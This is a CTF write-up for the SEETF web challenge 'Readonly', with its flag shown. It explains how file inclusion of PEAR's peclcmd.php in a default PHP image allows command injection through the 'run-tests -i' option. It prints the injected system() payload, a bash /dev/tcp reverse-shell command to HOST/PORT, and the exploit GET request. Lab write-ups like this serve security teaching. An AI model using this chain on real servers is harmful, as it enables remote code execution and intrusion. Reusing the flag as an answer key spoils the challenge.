# Readonly

**Author**: zeyu2001

**Category**: Web

Flag: `SEE{phpphpphpphpphpphp_41f8b2a8fd1c4e58b361e6dd0ffe9343}`

## Description

I am committing the cardinal sin of writing not just one, but two PHP challenges for the same CTF. At least this one has birds.

## Difficulty

Easy

## Deployment

`docker-compose up -d`

## Solution

This is basically last year's [Sourceless Guessy Web](https://github.com/Social-Engineering-Experts/SEETF-2022-Public/tree/main/web/sourceless-guessy-web), but the PHP container is read-only.

The default Docker PHP installation is used, which means that `register_argc_argv` is enabled, and PEAR is installed. This means that we can use the GET query parameters to pass command-line arguments to `/usr/local/lib/php/peclcmd.php` and run `peclcmd.php` as a PHP script.

The most well-known methods to achieve RCE through including `peclcmd.php` involve writing a webshell to disk (e.g. using `config-create`), and then including it. However, this is not possible in this challenge, because the PHP container is read-only.

We can take a look at the other commands available in `peclcmd.php`:

```text
$ php pearcmd.php
Commands:
build                  Build an Extension From C Source
bundle                 Unpacks a Pecl Package
channel-add            Add a Channel
channel-alias          Specify an alias to a channel name
channel-delete         Remove a Channel From the List
channel-discover       Initialize a Channel from its server
channel-info           Retrieve Information on a Channel
channel-login          Connects and authenticates to remote channel server
channel-logout         Logs out from the remote channel server
channel-update         Update an Existing Channel
clear-cache            Clear Web Services Cache
config-create          Create a Default configuration file
config-get             Show One Setting
config-help            Show Information About Setting
config-set             Change Setting
config-show            Show All Settings
convert                Convert a package.xml 1.0 to package.xml 2.0 format
cvsdiff                Run a "cvs diff" for all files in a package
cvstag                 Set CVS Release Tag
download               Download Package
download-all           Downloads each available package from the default channel
info                   Display information about a package
install                Install Package
list                   List Installed Packages In The Default Channel
list-all               List All Packages
list-channels          List Available Channels
list-files             List Files In Installed Package
list-upgrades          List Available Upgrades
login                  Connects and authenticates to remote server [Deprecated in favor of channel-login]
logout                 Logs out from the remote server [Deprecated in favor of channel-logout]
makerpm                Builds an RPM spec file from a PEAR package
package                Build Package
package-dependencies   Show package dependencies
package-validate       Validate Package Consistency
pickle                 Build PECL Package
remote-info            Information About Remote Packages
remote-list            List Remote Packages
run-scripts            Run Post-Install Scripts bundled with a package
run-tests              Run Regression Tests
search                 Search remote package database
shell-test             Shell Script Test
sign                   Sign a package distribution file
svntag                 Set SVN Release Tag
uninstall              Un-install Package
update-channels        Update the Channel List
upgrade                Upgrade Package
upgrade-all            Upgrade All Packages [Deprecated in favor of calling upgrade with no parameters]
Usage: pear [options] command [command-options] <parameters>
Type "pear help options" to list all options.
Type "pear help shortcuts" to list all command shortcuts.
Type "pear help version" or "pear version" to list version information.
Type "pear help <command>" to get the help for the specified command.
```

One of these commands is `run-tests`.

```text
$ php peclcmd.php help run-tests
pecl run-tests [options] [testfile|dir ...]
Run regression tests with PHP's regression testing script (run-tests.php).
Options:
  -r, --recur
        Run tests in child directories, recursively.  4 dirs deep maximum
  -i SETTINGS, --ini=SETTINGS
        actual string of settings to pass to php in format " -d setting=blah"
  -l, --realtimelog
        Log test runs/results as they are run
  -q, --quiet
        Only display detail for failed tests
  -s, --simple
        Display simple output for all tests
  -p, --package
        Treat parameters as installed packages from which to run tests
  -u, --phpunit
        Search parameters for AllTests.php, and use that to run phpunit-based tests
        If none is found, all .phpt tests will be tried instead.
  -t, --tapoutput
        Output run-tests.log in TAP-compliant format
  -c PHPCGI, --cgi=PHPCGI
        CGI php executable (needed for tests with POST/GET section)
  -x, --coverage
        Generate a code coverage report (requires Xdebug 2.0.0+)
  -d, --showdiff
        Output diff on test failure
```

Looking at the available options, we can see that we can pass a `-i` argument to set the

> actual string of settings to pass to php in format " -d setting=blah"

Interestingly, while the option is meant to be used to pass PHP INI settings, we are expected to pass a string of command-line arguments to `php` instead. This means that instead of passing `-d setting=blah`, we can pass `-r '...'` to run arbitrary PHP code.

The settings are parsed in `./PEAR/Command/Test.php`.

```php
function doRunTests($command, $options, $params)
{
    ...

     $ini_settings = '';
    if (isset($options['ini'])) {
        $ini_settings .= $options['ini'];
    }

    if (isset($_ENV['TEST_PHP_INCLUDE_PATH'])) {
        $ini_settings .= " -d include_path={$_ENV['TEST_PHP_INCLUDE_PATH']}";
    }

    if ($ini_settings) {
        $this->ui->outputData('Using INI settings: "' . $ini_settings . '"');
    }

    ...

    $result = $run->run($t, $ini_settings, $j);
}
```

The shell command is then constructed in `./PEAR/RunTest.php`. The `$ini_settings` is directly concatenated to the `php` command:

```php
function run($file, $ini_settings = array(), $test_number = 1)
{
    
    ...

    $args = $section_text['ARGS'] ? ' -- '.$section_text['ARGS'] : '';
    $cmd = $this->_preparePhpBin($this->_php, $temp_file, $ini_settings);
    $cmd.= "$args 2>&1";
}

function _preparePhpBin($php, $file, $ini_settings)
{
    $file = escapeshellarg($file);
    $cmd = $php . $ini_settings . ' -f ' . $file;

    return $cmd;
}
```

Now, all we need is a valid test file. Lucky for us, there are a few tests files already in `/usr/local/lib/php/test/Console_Getopt/tests/`:

```bash
$ find / -name "*.phpt"
/usr/local/lib/php/test/Console_Getopt/tests/001-getopt.phpt
/usr/local/lib/php/test/Console_Getopt/tests/bug10557.phpt
/usr/local/lib/php/test/Console_Getopt/tests/bug13140.phpt
/usr/local/lib/php/test/Console_Getopt/tests/bug11068.phpt
```

This allows us to craft the following valid command (which injects `sleep 5`). We avoid using spaces in the command to avoid issues with the shell escaping.

```bash
php peclcmd.php run-tests -i "-r\"system(hex2bin('736C6565702035'));\"" /usr/local/lib/php/test/Console_Getopt/tests/bug11068.phpt
```

This can be extended to get a shell by replacing the hex payload with the hex-encoded `bash -c "bash -i >& /dev/tcp/HOST/PORT 0>&1"`. Translating the `argv` to the GET parameters, we get the following request:

```http
GET /?page=../usr/local/lib/php/peclcmd.php&+run-tests+-i+-r"system(hex2bin('PAYLOAD'));"+/usr/local/lib/php/test/Console_Getopt/tests/bug11068.phpt HTTP/1.1
```

From there, we can read the flag.

```bash
www-data@abac37fa386c:/app$ /readflag
SEE{phpphpphpphpphpphp_41f8b2a8fd1c4e58b361e6dd0ffe9343}
www-data@abac37fa386c:/app$
```